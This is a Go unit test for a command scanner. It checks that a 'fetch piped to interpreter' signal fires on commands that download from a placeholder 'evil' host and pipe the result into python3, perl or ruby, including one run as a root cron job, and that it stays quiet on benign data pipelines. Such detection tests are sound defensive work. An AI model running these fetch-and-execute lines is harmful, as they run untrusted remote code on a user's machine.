package core

import "testing"

func TestFetchPipedToScriptingInterpreter(t *testing.T) {
	fire := []string{
		"curl -s http://evil/x | python3",
		"wget -qO- http://evil/x | perl",
		"curl -s http://evil/x | python3 -",
		"curl -s http://evil/x | python3 -u",
		"base64 -d <<< AAAA | ruby",
		"*/5 * * * * root curl -s http://evil/x | python3",
	}
	noFire := []string{
		"curl -s http://api/data | python3 parse.py",   // script-file arg -> data pipeline
		"curl -s http://api/data | python3 -c 'import sys'", // inline code; pipe is data
		"curl -s http://api/data | perl -e 'print'",     // inline code
		"curl -s http://api/data | python3 -m json.tool", // module; pipe is data
		"curl -s http://api/data | jq .",                 // non-interpreter sink
	}
	for _, c := range fire {
		if !hasSig(ScanBehavioral(c), SignalFetchPipedToInterpreter) {
			t.Errorf("EXPECTED fire: %q -> %v", c, ScanBehavioral(c))
		}
	}
	for _, c := range noFire {
		if hasSig(ScanBehavioral(c), SignalFetchPipedToInterpreter) {
			t.Errorf("EXPECTED no-fire (FP): %q -> %v", c, ScanBehavioral(c))
		}
	}
}
